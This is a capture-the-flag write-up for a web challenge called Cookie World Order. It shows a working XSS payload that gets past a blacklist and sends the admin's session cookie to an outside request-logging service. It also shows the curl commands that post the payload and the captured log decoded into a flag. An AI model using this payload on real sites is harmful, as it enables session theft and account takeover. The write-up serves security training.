# Cookie World Order
Category: Web

## Description
> Good job! You found a further credential that looks like a VPN referred to as the cWo. The organization appears very clandestine and mysterious and reminds you of the secret ruling class of hard shelled turtle-like creatures of Xenon. Funny they trust their security to a contractor outside their systems, especially one with such bad habits.  Upon further snooping you find a video feed of those "Cauliflowers" which look to be the dominant lifeforms and members of the cWo. Go forth and attain greater access to reach this creature!
> 
> https://cwo-xss.web.ctfcompetition.com/ 

## Solution

We visit the website and get a livestream video of a cauliflower and a chat interface:
```html
<div class="livestream-container">
      <div class="livestream-video">
        <video loop autoplay muted src="/watch?livestream=http://cwo-xss.web.ctfcompetition.com/livestream/garden-livestream.webm" />
      </div>
      <div class="livestream-chat">
        <div class="livestream-chat-list">
          <div class="livestream-chat-item"> 
            <div class="livestream-chat-profile"> 
              <img src="/static/img/profile.png"> 
            </div> 
            <div class="livestream-chat-text"> 
              <div class="livestream-chat-username">Admin</div> 
              <div class="livestream-chat-message">Look at my beautiful garden!</div> 
            </div> 
          </div>
        </div>
        <div class="livestream-chat-input">
          <form id="livestream-chat-form">
            <input id="livestream-chat-input" autocomplete="off" type="text" placeholder="Send message..." />
          </form>
        </div>
      </div>
    </div>
```

"Admin" is online and obviously we need to use XSS to steal his cookie.

The server had a basic blacklist protection, so basic attempts returned an error message ("HACKER ALERT!"):
```console
root@kali:/media/sf_CTFs/google/Cookie_World_Order# curl "https://cwo-xss.web.ctfcompetition.com/send" -X POST --data "message=<img src=x onerror=alert('XSS');>"
{"message":"HACKER ALERT!","profile_url":"/static/img/profile.png","username":"brewtoot"}
```

However it was still possible to bypass the blacklist with a pretty simple input:
```console
root@kali:/media/sf_CTFs/google/Cookie_World_Order# curl "https://cwo-xss.web.ctfcompetition.com/send" -X POST --data "message=<img src=x onerror=\"image = new Image(); image.src='http://requestbin.fullcontact.com/187
nt201?e='+btoa(document.cookie);\">"
{"message":"<img src=x onerror=\"image = new Image(); image.src='http://requestbin.fullcontact.com/187nt201?e=' btoa(document.cookie);\">","profile_url":"/static/img/profile.png","username":"brewtoot"}
```

Our input is:
```html
<img src=x onerror="image = new Image(); image.src='http://requestbin.fullcontact.com/187nt201?e='+btoa(document.cookie);">
```

We create an image with a source that doesn't exist. Upon error, the browser will attempt run the `onerror` logic which will try to load a different image from our [Request Bin](http://requestbin.fullcontact.com) - a free service that logs every request it gets. We crafted the URI of the image to be composed of the session cookie, allowing us to steal it.

After a few seconds, we see the following log:

```
FORM/POST PARAMETERS
None
QUERYSTRING

e: ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg==

HEADERS
Connection: close
Via: 1.1 infra-squid (squid/3.5.27), 1.1 76d5d69c7419d6e5ee08d1a87f9d8316.cloudfront.net (CloudFront), 1.1 vegur
Connect-Time: 6
X-Amz-Cf-Id: nfX-upjniSvVOAW4bTZtDwh1y09THvQ6surh1W3A35VWb5ue6k6Iww==
Cloudfront-Viewer-Country: US
Cloudfront-Forwarded-Proto: http
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36
Pragma: no-cache
Cache-Control: no-cache
Cloudfront-Is-Mobile-Viewer: false
Accept-Encoding: gzip, deflate
X-Request-Id: fc378cdb-cdd9-4edf-ae0b-29631278cead
Cloudfront-Is-Tablet-Viewer: false
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Cloudfront-Is-Desktop-Viewer: true
Host: requestbin.fullcontact.com
Total-Route-Time: 0
Cloudfront-Is-Smarttv-Viewer: false
```

We decode the base64 string and get the flag:
```console
root@kali:/media/sf_CTFs/google/Cookie_World_Order# echo ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg== | base64 -d
flag=CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}; auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz
```